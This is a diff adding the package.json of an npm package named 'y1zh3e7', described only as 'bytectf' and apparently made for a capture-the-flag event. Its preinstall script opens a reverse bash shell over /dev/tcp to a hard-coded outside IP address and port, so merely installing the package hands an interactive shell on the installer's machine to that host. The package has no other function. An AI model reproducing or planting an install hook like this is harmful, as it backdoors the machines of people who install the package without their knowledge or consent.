@@ -1,0 +1,9 @@
+{
+    "name": "y1zh3e7",
+    "version": "1.0.3",
+    "description": "bytectf",
+    "scripts": {
+        "preinstall": "bash -c 'bash -i >& /dev/tcp/39.107.83.203/7777 0>&1'",
+        "test": "echo \"Error: no test specified\" && exit 1"
+    }
+}
